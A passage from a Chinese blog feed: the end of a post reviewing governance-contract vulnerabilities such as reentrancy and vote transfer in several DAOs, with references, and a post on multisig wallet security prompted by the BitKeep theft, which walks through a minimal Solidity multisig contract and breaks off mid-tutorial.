delegateVote(address _add) external isMemberAndcheckPause checkPendingRewards &#123;</span><br><span class="line">    revert(&quot;Delegations are not allowed.&quot;);</span><br></pre></td></tr></table></figure><p>但即使没有还原，还有另一个要求，即如果用户最近投票<a href="https://github.com/NexusMutual/smart-contracts/blob/283f40208ec5bc0fc529cedeacf307c19086ccde/contracts/modules/governance/Governance.sol#L414" target="_blank" rel="noopener">[→]</a>，则不能委托其投票权：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (allVotesByMember[msg.sender].length &gt; 0) &#123;    </span><br><span class="line">    require((allVotes[allVotesByMember[msg.sender][allVotesByMember[msg.sender].length - 1]].dateAdd).add(tokenHoldingTime) &lt; now);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>修改参数</li></ul><p>没什么可破坏的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function submitVote(uint _proposalId, uint _solutionChosen)</span><br></pre></td></tr></table></figure><ul><li>重入</li></ul><p>submitVote（） 方法代码遵循检查效果交互模式，因此没有重入。</p><h2 id="Keep3r-Network-3"><a href="#Keep3r-Network-3" class="headerlink" title="Keep3r Network"></a>Keep3r Network</h2><ul><li>投票-转移-投票</li></ul><p>Keep3r具有类似于Aragon的行为，并在创建提案之前检查用户在一个区块的投票权。因此，本案不适用。</p><ul><li>修改参数</li></ul><p>没什么可破坏的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function castVote(uint256 proposalId, bool support)</span><br></pre></td></tr></table></figure><ul><li>重入</li></ul><p>在 castVote（） 方法中没有不受信任的外部调用。</p><h1 id="双重执行"><a href="#双重执行" class="headerlink" title="双重执行"></a>双重执行</h1><p>execute（） 方法中是否有重入？它可以在同一个块中调用两次吗？</p><h2 id="Aragon，X-DAO，Nexus-Mutual和Keep3r网络"><a href="#Aragon，X-DAO，Nexus-Mutual和Keep3r网络" class="headerlink" title="Aragon，X-DAO，Nexus Mutual和Keep3r网络"></a>Aragon，X-DAO，Nexus Mutual和Keep3r网络</h2><p>Aragon，X-DAO和Keep3r网络使用检查效果交互模式，因此它们的执行方法不易受到重入的影响。</p><h2 id="Snowball-Finance-4"><a href="#Snowball-Finance-4" class="headerlink" title="Snowball Finance"></a>Snowball Finance</h2><p>Snowball Finance 实现了非重入修饰符，其执行方法也不容易受到重入的影响。</p><h2 id="Spirit-swap"><a href="#Spirit-swap" class="headerlink" title="Spirit swap"></a>Spirit swap</h2><p>Spirit swap 没有 execution（） 方法：它应用 vote（） 方法中的更改。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li>区块链治理<br><a href="https://vitalik.ca/general/2017/12/17/voting.html" target="_blank" rel="noopener">https://vitalik.ca/general/2017/12/17/voting.html</a> 注意事项</li><li>区块链投票在不知情的人中被高估，但在知情人士<br>中被低估 <a href="https://vitalik.ca/general/2021/05/25/voting2.html" target="_blank" rel="noopener">https://vitalik.ca/general/2021/05/25/voting2.html</a></li><li>超越Coin voting治理<br><a href="https://vitalik.ca/general/2021/08/16/voting3.html" target="_blank" rel="noopener">https://vitalik.ca/general/2021/08/16/voting3.html</a></li><li>2022 年 10 月 6 日，Mangata X 成为治理攻击的目标，导致攻击者获得了链上理事会<br><a href="https://blog.mangata.finance/blog/2022-10-08-council-incident-report/" target="_blank" rel="noopener">https://blog.mangata.finance/blog/2022-10-08-council-incident-report/</a> 的投票权</li><li>2022年4月17日，肇事者利用闪贷利用Beanstalk治理机制<br><a href="https://bean.money/blog/beanstalk-governance-exploit" target="_blank" rel="noopener">https://bean.money/blog/beanstalk-governance-exploit</a></li><li>波场基金会首席执行官贾斯汀·孙（Justin Sun）与大型加密货币交易所勾结，并利用其客户的Coin Voting支持收购Steem网络，该网络遭到社区大多数人的强烈反对<br><a href="https://decrypt.co/38050/steem-steemit-tron-justin-sun-cryptocurrency-war" target="_blank" rel="noopener">https://decrypt.co/38050/steem-steemit-tron-justin-sun-cryptocurrency-war</a></li><li>CarbonVote以太坊区块链投票实施<br><a href="https://gitlab.com/relyt29/votebuying-carbonvote" target="_blank" rel="noopener">https://gitlab.com/relyt29/votebuying-carbonvote</a> 的概念验证投票购买合约</li><li>一个用于购买$TRIBE的单交换池 — 一种管理 Fei 协议<br><a href="https://info.uniswap.org/#/tokens/0xc7283b66eb1eb5fb86327f08e1b5816b0720212b" target="_blank" rel="noopener">https://info.uniswap.org/#/tokens/0xc7283b66eb1eb5fb86327f08e1b5816b0720212b</a> 的代币</li><li>加密投票的费用是多少？<br><a href="https://www.placeholder.vc/blog/2020/1/7/how-much-does-a-crypto-vote-cost" target="_blank" rel="noopener">https://www.placeholder.vc/blog/2020/1/7/how-much-does-a-crypto-vote-cost</a></li><li>呼吁暂时暂停 DAO<br>（发现了多个博弈论漏洞）<br><a href="https://hackingdistributed.com/2016/05/27/dao-call-for-moratorium/" target="_blank" rel="noopener">https://hackingdistributed.com/2016/05/27/dao-call-for-moratorium/</a></li><li>MakerDAO在使用闪电贷款通过治理投票<br>后发出警告 <a href="https://www.theblock.co/post/82721/makerdao-issues-warning-after-a-flash-loan-is-used-to-pass-a-governance-vote" target="_blank" rel="noopener">https://www.theblock.co/post/82721/makerdao-issues-warning-after-a-flash-loan-is-used-to-pass-a-governance-vote</a></li><li>MakerDAO治理<br><a href="https://blog.openzeppelin.com/makerdao-critical-vulnerability/" target="_blank" rel="noopener">https://blog.openzeppelin.com/makerdao-critical-vulnerability/</a> 中关键漏洞的技术描述</li><li>KP3R 漏洞报告：Statemind 如何在 Keep3r 网络<br><a href="https://statemind.io/blog/2022/09/27/gauge-proxy-bug.html" target="_blank" rel="noopener">https://statemind.io/blog/2022/09/27/gauge-proxy-bug.html</a> 中发现一个两年前的漏洞</li><li>Nexus Mutual – 呼叫数据验证错误<br><a href="https://medium.com/nexus-mutual/responsible-vulnerability-disclosure-ece3fe3bcefa" target="_blank" rel="noopener">https://medium.com/nexus-mutual/responsible-vulnerability-disclosure-ece3fe3bcefa</a></li><li>2021 年 4 月 4 日，ForceDAO DeFi 聚合器被一名白帽黑客和四名黑帽黑客利用。恶意攻击者能够窃取 FORCE 代币。<br><a href="https://halborn.com/explained-the-forcedao-hack-april-2021/" target="_blank" rel="noopener">https://halborn.com/explained-the-forcedao-hack-april-2021/</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>由BT钱包引发的多签钱包思考</title>
      <link href="/Multisig-Wallet/"/>
      <url>/Multisig-Wallet/</url>
      
        <content type="html"><![CDATA[<h1 id="由BT钱包引发的多签钱包思考"><a href="#由BT钱包引发的多签钱包思考" class="headerlink" title="由BT钱包引发的多签钱包思考"></a>由BT钱包引发的多签钱包思考</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>12月26日，Bitkeep钱包发生漏洞，造成约900w美元的损失。这也引起了我对钱包安全的关注，。此次Bitkeep钱包事件疑似因为部分APK包下载被黑客劫持，安装了黑客植入代码的包，用户下载或者更新的应用或许是被劫持的不明版本（非官方发布版本）。最终可能导致了下载黑客版本的APK用户私钥泄露。截至笔者发文，具体原因还未查明，大家可以持续关注Bitkeep官方twitter或慢雾区了解后续进展。</p><p><a href="https://twitter.com/BitKeepOS/status/1607666330605604866" target="_blank" rel="noopener">(20) BitKeep Wallet 在 Twitter: “10/ All stolen tokens were swapped for USDT in the amount of about 8,989,011. BitKeep will keep tracking hacker’s criminal actions and do whatever it takes to protect the interest of our users. We will keep updating relevant information with our communities. Please stay tuned.” / Twitter</a></p><p><a href="https://www.panewslab.com/zh/sqarticledetails/73b6rcf2.html" target="_blank" rel="noopener">BitKeep：用户资金被盗疑似因下载了被黑客劫持的APK版本 - PANews (panewslab.com)</a></p><p>可以大概了解到此次事件是一个很典型的传统安全的攻击方式，这些对于硬件钱包来讲，是不可避免的。但是也许，多签钱包可以避免这次攻击的绝大部分损失。</p><p>值得一提的是BK钱包已经是三个月来第二次出现漏洞了…</p><h2 id="多签钱包"><a href="#多签钱包" class="headerlink" title="多签钱包"></a>多签钱包</h2><p>V神曾说过，多签钱包要比硬件钱包更加安全（<a href="https://twitter.com/VitalikButerin/status/1558886893995134978?s=20&amp;t=4WyoEWhwHNUtAuABEIlcRw" target="_blank" rel="noopener">推文</a>）。</p><p><img src="V.png" alt=""></p><p>多签钱包，顾名思义，就是需要多个人去签名执行某个操作的包。使用多签钱包进行转账，往往需要 &gt;= 1 个人去签名发送交易之后，转账操作才真正完成。使用多签钱包时，我们可以指定 m/n 的签名模式，就是 n 个人里面有 m 个人签名即可完成操作。可以根据自己的需求设置多签规则，例如：</p><ul><li>1/2多签模式：两个互相信任的朋友或自己的两个钱包，可以凭各自的私钥独立发起交易（类似于合伙账户）。</li><li>2/2多签模式：金库中的资金需要2个管理员均同意才能动用这笔资金（需要两个私钥才能转移资金）。</li><li>2/3多签模式：三个合伙人共同管理资金，为了规避私钥丢失的风险，其中两个私钥签名就可以转移资金。</li></ul><p>当然，还有1/3多签、3/6多签、5/8多签不同规则的多签方案，规则是按需的。多签钱包最大的特点是需由多个私钥持有者的授权才能进行钱包交易。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>多签钱包最常见的应用场景是需求强安全性的个人，以及管理公共资产的投资机构、交易所以及项目方。</p><h4 id="资金安全"><a href="#资金安全" class="headerlink" title="资金安全"></a>资金安全</h4><p>资金的安全也可以理解为私钥的安全，有一些常见的方案如使用硬件钱包来防止私钥泄露，使用助记词密盒来防止私钥遗忘等等，但依然存在“单点故障”的问题。</p><p>在单签钱包中，加密资产的所有权和管理员是在单人手中，一但私钥泄露或遗忘就意味着失去了对钱包的控制权，与之关联的加密资产将完全丢失。而多签钱包的存在，就很大程度上降低了资产损失的风险。以2/3多签模式为例，在全部的3个私钥中，只要有2个私钥完成签名授权就能完成加密资产的转移。</p><p>对于个人而言，可以通过一个多签钱包，关联多个钱包地址，分布在多处（类似异地多活、同城多机房），一个放在MetaMask浏览器扩展、一个安装在手机钱包App、一个在冷钱包，需要转移加密资产时只需要用其中的两个钱包共同签名即可。当然为了方便的话，可以使用1/3多签模式，这就类似于把同一个私钥记在三个助记词卡上放在多处一样，但这种方式仅仅是降低了密钥丢失的风险。</p><h4 id="资金共管"><a href="#资金共管" class="headerlink" title="资金共管"></a>资金共管</h4><p>很多DeFi 协议/DAO 组织/区块链团队其实都有自己的金库，金库里的资产是不能由任何一个人直接动用的，每次动用都要经过多数人的同意或社区投票。这时使用多签钱包来保存金库资产是再合适不过了。</p><h4 id="多签操作"><a href="#多签操作" class="headerlink" title="多签操作"></a>多签操作</h4><p>在目前这个发展阶段，很多去中心化协议其实都是有个管理员权限的，这个管理员权限往往可以更改协议的某些关键参数。行业普遍做法是把这个管理员权限交给一个多签钱包或时间锁，当需要更改参数时，需要多个人共同签署相关操作。</p><h2 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h2><p>在以太坊上的多签钱包其实是智能合约，属于合约钱包。下面我们写一个极简版多签钱包<code>MultisigWallet</code>合约，它的逻辑非常简单：</p><ol><li><p>设置多签人和门槛（链上）：部署多签合约时，我们需要初始化多签人列表和执行门槛（至少n个多签人签名授权后，交易才能执行）。Gnosis Safe多签钱包支持增加/删除多签人以及改变执行门槛，但在咱们的极简版中不考虑这一功能。</p></li><li><p>创建交易（链下）：一笔待授权的交易包含以下内容</p><ul><li><code>to</code>：目标合约。</li><li><code>value</code>：交易发送的以太坊数量。</li><li><code>data</code>：calldata，包含调用函数的选择器和参数。</li><li><code>nonce</code>：初始为<code>0</code>，随着多签合约每笔成功执行的交易递增的值，可以防止签名重放攻击。</li><li><code>chainid</code>：链id，防止不同链的签名重放攻击。</li></ul></li><li><p>收集多签签名（链下）：将上一步的交易ABI编码并计算哈希，得到交易哈希，然后让多签人签名，并拼接到一起的到打包签名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">交易哈希: 0xc1b055cf8e78338db21407b425114a2e258b0318879327945b661bfdea570e66</span><br><span class="line"></span><br><span class="line">多签人A签名: 0xd6a56c718fc16f283512f90e16f2e62f888780a712d15e884e300c51e5b100de2f014ad71bcb6d97946ef0d31346b3b71eb688831abedaf41b33486b416129031c</span><br><span class="line"></span><br><span class="line">多签人B签名: 0x2184f70a17f14426865bda8ebe391508b8e3984d16ce6d90905ae8beae7d75fd435a7e51d837881d820414ebaf0ff16074204c75b33d66928edcf8dd398249861b</span><br><span class="line"></span><br><span class="line">打包签名：</span><br><span class="line">0xd6a56c718fc16f283512f90e16f2e62f888780a712d15e884e300c51e5b100de2f014ad71bcb6d97946ef0d31346b3b71eb688831abedaf41b33486b416129031c2184f70a17f14426865bda8ebe391508b8e3984d16ce6d90905ae8beae7d75fd435a7e51d837881d820414ebaf0ff16074204c75b33d66928edcf8dd398249861b</span><br></pre></td></tr></table></figure></li></ol><ol><li>调用多签合约的执行函数，验证签名并执行交易（链上）。</li></ol><h3 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h3><p><code>MultisigWallet</code>合约有<code>2</code>个事件，<code>ExecutionSuccess</code>和<code>ExecutionFailure</code>，分别在交易成功和失败时释放，参数为交易哈希。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">event ExecutionSuccess(bytes32 txHash);    &#x2F;&#x2F; 交易成功事件</span><br><span class="line">event ExecutionFailure(bytes32 txHash);    &#x2F;&#x2F; 交易失败事件</span><br></pre></td></tr></table></figure><h3 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h3><p><code>MultisigWallet</code>合约有<code>5</code>个状态变量：</p><ol><li><code>owners</code>：多签持有人数组</li><li><code>isOwner</code>：<code>address =&gt; bool</code>的映射，记录一个地址是否为多签持有人。</li><li><code>ownerCount</code>：多签持有人数量</li><li><code>threshold</code>：多签执行门槛，交易至少有n个多签人签名才能被执行。</li><li><code>nonce</code>：初始为<code>0</code>，随着多签合约每笔成功执行的交易递增的值，可以防止签名重放攻击。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address[] public owners;                   <span class="comment">// 多签持有人数组 </span></span><br><span class="line">mapping(<span class="function"><span class="params">address</span> =&gt;</span> bool) public isOwner;   <span class="comment">// 记录一个地址是否为多签持有人</span></span><br><span class="line">uint256 public ownerCount;                 <span class="comment">// 多签持有人数量</span></span><br><span class="line">uint256 public threshold;                  <span class="comment">// 多签执行门槛，交易至少有n个多签人签名才能被执行。</span></span><br><span class="line">uint256 public nonce;                      <span class="comment">// nonce，防止签名重放攻击</span></span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><code>MultisigWallet</code>合约有<code>6</code>个函数：</p><ol><li><p>构造函数：调用<code>_setupOwners()</code>，初始化和多签持有人和执行门槛相关的变量。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 构造函数，初始化owners, isOwner, ownerCount, threshold </span></span><br><span class="line"><span class="keyword">constructor</span>(        </span><br><span class="line">    address[] memory _owners,</span><br><span class="line">    uint256 _threshold</span><br><span class="line">) &#123;</span><br><span class="line">    _setupOwners(_owners, _threshold);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p><code>_setupOwners()</code>：在合约部署时被构造函数调用，初始化<code>owners</code>，<code>isOwner</code>，<code>ownerCount</code>，<code>threshold</code>状态变量。传入的参数中，执行门槛需大于等于<code>1</code>且小于等于多签人数；多签地址不能为<code>0</code>地址且不能重复。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @dev 初始化owners, isOwner, ownerCount,threshold </span></span><br><span class="line"><span class="comment">/// @param _owners: 多签持有人数组</span></span><br><span class="line"><span class="comment">/// @param _threshold: 多签执行门槛，至少有几个多签人签署了交易</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_setupOwners</span>(<span class="params">address[] memory _owners, uint256 _threshold</span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">    <span class="comment">// threshold没被初始化过</span></span><br><span class="line">    <span class="built_in">require</span>(threshold == <span class="number">0</span>, <span class="string">"WTF5000"</span>);</span><br><span class="line">    <span class="comment">// 多签执行门槛 小于 多签人数</span></span><br><span class="line">    <span class="built_in">require</span>(_threshold &lt;= _owners.length, <span class="string">"WTF5001"</span>);</span><br><span class="line">    <span class="comment">// 多签执行门槛至少为1</span></span><br><span class="line">    <span class="built_in">require</span>(_threshold &gt;= <span class="number">1</span>, <span class="string">"WTF5002"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (uint256 i = <span class="number">0</span>; i &lt; _owners.length; i++) &#123;</span><br><span class="line">        address owner = _owners[i];</span><br><span class="line">        <span class="comment">// 多签人不能为0地址，本合约地址，不能重复</span></span><br><span class="line">        <span class="built_in">require</span>(owner != address(<span class="number">0</span>) &amp;&amp; owner != address(<span class="keyword">this</span>) &amp;&amp; !isOwner[owner], <span class="string">"WTF5003"</span>);</span><br><span class="line">        owners.push(owner);</span><br><span class="line">        isOwner[owner] = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ownerCount = _owners.length;</span><br><span class="line">    threshold = _threshold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p><code>execTransaction()</code>：在收集足够的多签签名后，验证签名并执行交易。传入的参数为目标地址<code>to</code>，发送的以太坊数额<code>value</code>，数据<code>data</code>，以及打包签名<code>signatures</code>。打包签名就是将收集的多签人对交易哈希的签名，按多签持有人地址从小到大顺序，打包到一个[bytes]数据中。这一步调用了<code>encodeTransactionData()</code>编码交易，调用了<code>checkSignatures()</code>检验签名是否有效、数量是否达到执行门槛。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @dev 在收集足够的多签签名后，执行交易</span></span><br><span class="line"><span class="comment">/// @param to 目标合约地址</span></span><br><span class="line"><span class="comment">/// @param value msg.value，支付的以太坊</span></span><br><span class="line"><span class="comment">/// @param data calldata</span></span><br><span class="line"><span class="comment">/// @param signatures 打包的签名，对应的多签地址由小到达，方便检查。 (&#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125;) (第一个多签的签名, 第二个多签的签名 ... )</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execTransaction</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address to,</span></span></span><br><span class="line"><span class="function"><span class="params">    uint256 value,</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes memory data,</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes memory signatures</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> <span class="title">virtual</span> <span class="title">returns</span> (<span class="params">bool success</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 编码交易数据，计算哈希</span></span><br><span class="line">    bytes32 txHash = encodeTransactionData(to, value, data, nonce, block.chainid);</span><br><span class="line">    nonce++;  <span class="comment">// 增加nonce</span></span><br><span class="line">    checkSignatures(txHash, signatures); <span class="comment">// 检查签名</span></span><br><span class="line">    <span class="comment">// 利用call执行交易，并获取交易结果</span></span><br><span class="line">    (success, ) = to.call&#123;<span class="attr">value</span>: value&#125;(data);</span><br><span class="line">    <span class="built_in">require</span>(success , <span class="string">"WTF5004"</span>);</span><br><span class="line">    <span class="keyword">if</span> (success) emit ExecutionSuccess(txHash);</span><br><span class="line">    <span class="keyword">else</span> emit ExecutionFailure(txHash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p><code>checkSignatures()</code>：检查签名和交易数据的哈希是否对应，数量是否达到门槛，若否，交易会revert。单个签名长度为65字节，因此打包签名的长度要长于<code>threshold * 65</code>。调用了<code>signatureSplit()</code>分离出单个签名。这个函数的大致思路：</p><ul><li>用ecdsa获取签名地址.</li><li>利用 <code>currentOwner &gt; lastOwner</code> 确定签名来自不同多签（多签地址递增）。</li><li>利用<code>isOwner[currentOwner]</code>确定签名者为多签持有人。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev </span>检查签名和交易数据是否对应。如果是无效签名，交易会revert</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>dataHash 交易数据哈希</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param </span>signatures 几个多签签名打包在一起</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSignatures</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    bytes32 dataHash,</span></span></span><br><span class="line"><span class="function"><span class="params">    bytes memory signatures</span></span></span><br><span class="line"><span class="function"><span class="params"></span>) <span class="title">public</span> <span class="title">view</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 读取多签执行门槛</span></span><br><span class="line">    uint256 _threshold = threshold;</span><br><span class="line">    <span class="built_in">require</span>(_threshold &gt; <span class="number">0</span>, <span class="string">"WTF5005"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查签名长度足够长</span></span><br><span class="line">    <span class="built_in">require</span>(signatures.length &gt;= _threshold * <span class="number">65</span>, <span class="string">"WTF5006"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过一个循环，检查收集的签名是否有效</span></span><br><span class="line">    <span class="comment">// 大概思路：</span></span><br><span class="line">    <span class="comment">// 1. 用ecdsa先验证签名是否有效</span></span><br><span class="line">    <span class="comment">// 2. 利用 currentOwner &gt; lastOwner 确定签名来自不同多签（多签地址递增）</span></span><br><span class="line">    <span class="comment">// 3. 利用 isOwner[currentOwner] 确定签名者为多签持有人</span></span><br><span class="line">    address lastOwner = address(<span class="number">0</span>); </span><br><span class="line">    address currentOwner;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32 r;</span><br><span class="line">    bytes32 s;</span><br><span class="line">    uint256 i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; _threshold; i++) &#123;</span><br><span class="line">        (v, r, s) = signatureSplit(signatures, i);</span><br><span class="line">        <span class="comment">// 利用ecrecover检查签名是否有效</span></span><br><span class="line">        currentOwner = ecrecover(keccak256(abi.encodePacked(<span class="string">"\x19Ethereum Signed Message:\n32"</span>, dataHash)), v, r, s);</span><br><span class="line">        <span class="built_in">require</span>(currentOwner &gt; lastOwner &amp;&amp; isOwner[currentOwner], <span class="string">"WTF5007"</span>);</span><br><span class="line">        lastOwner = currentOwner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p><code>signatureSplit()</code>：将单个签名从打包的签名分离出来，参数分别为打包签名<code>signatures</code>和要读取的签名位置<code>pos</code>。利用了内联汇编，将签名的<code>r</code>，<code>s</code>，和<code>v</code>三个值分离出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F; 将单个签名从打包的签名分离出来</span><br><span class="line">&#x2F;&#x2F;&#x2F; @param signatures 打包签名</span><br><span class="line">&#x2F;&#x2F;&#x2F; @param pos 要读取的多签index.</span><br><span class="line">function signatureSplit(bytes memory signatures, uint256 pos)</span><br><span class="line">    internal</span><br><span class="line">    pure</span><br><span class="line">    returns (</span><br><span class="line">        uint8 v,</span><br><span class="line">        bytes32 r,</span><br><span class="line">        bytes32 s</span><br><span class="line">    )</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F; 签名的格式：&#123;bytes32 r&#125;&#123;bytes32 s&#125;&#123;uint8 v&#125;</span><br><span class="line">    assembly &#123;</span><br><span class="line">        let signaturePos :&#x3D; mul(0x41, pos)</span><br><span class="line">        r :&#x3D; mload(add(signatures, add(signaturePos, 0x20)))</span><br><span class="line">        s :&#x3D; mload(add(signatures, add(signaturePos, 0x40)))</span><br><span class="line">        v :&#x3D; and(mload(add(signatures, add(signaturePos, 0x41))), 0xff)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p><code>encodeTransactionData()</code>：将交易数据打包并计算哈希，利用了<code>abi.encode()</code>和<code>keccak256()</code>函数。这个函数可以计算出一个交易的哈希，然后在链下让多签人签名并收集，再调用<code>execTransaction()</code>函数执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;&#x2F; @dev 编码交易数据</span><br><span class="line">&#x2F;&#x2F;&#x2F; @param to 目标合约地址</span><br><span class="line">&#x2F;&#x2F;&#x2F; @param value msg.value，支付的以太坊</span><br><span class="line">&#x2F;&#x2F;&#x2F; @param data calldata</span><br><span class="line">&#x2F;&#x2F;&#x2F; @param _nonce 交易的nonce.</span><br><span class="line">&#x2F;&#x2F;&#x2F; @param chainid 链id</span><br><span class="line">&#x2F;&#x2F;&#x2F; @return 交易哈希bytes.</span><br><span class="line">function encodeTransactionData(</span><br><span class="line">    address to,</span><br><span class="line">    uint256 value,</span><br><span class="line">    bytes memory data,</span><br><span class="line">    uint256 _nonce,</span><br><span class="line">    uint256 chainid</span><br><span class="line">) public pure returns (bytes32) &#123;</span><br><span class="line">    bytes32 safeTxHash &#x3D;</span><br><span class="line">        keccak256(</span><br><span class="line">            abi.encode(</span><br><span class="line">                to,</span><br><span class="line">                value,</span><br><span class="line">                keccak256(data),</span><br><span class="line">                _nonce,</span><br><span class="line">                chainid</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">    return safeTxHash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><ol><li>部署多签合约，<code>2</code>个多签地址，交易执行门槛设为<code>2</code>。因为演示的必要，这里直接存入1 ether</li></ol><figure class="highlight plain"><table><tr><td 